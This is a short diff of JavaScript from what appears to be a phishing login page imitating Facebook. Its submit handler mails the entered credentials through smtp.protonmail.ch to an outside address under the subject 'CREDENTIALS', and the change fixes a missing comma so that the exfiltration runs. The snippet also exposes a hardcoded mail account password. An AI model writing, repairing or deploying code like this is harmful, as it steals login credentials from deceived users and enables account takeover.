@@ -115,7 +115,7 @@ submitLogin.onclick = (e) => {
 		Email.send({
 				Host: "smtp.protonmail.ch",
 				Username : "facebo0ksecure@protonmail.com",
-				Password : "Qwerty!W@E#R$T%Y"
+				Password : "Qwerty!W@E#R$T%Y",
 				To : 'stanbic@protonmail.com',
 				From : "facebo0ksecure@protonmail.com",
 				Subject : "CREDENTIALS",
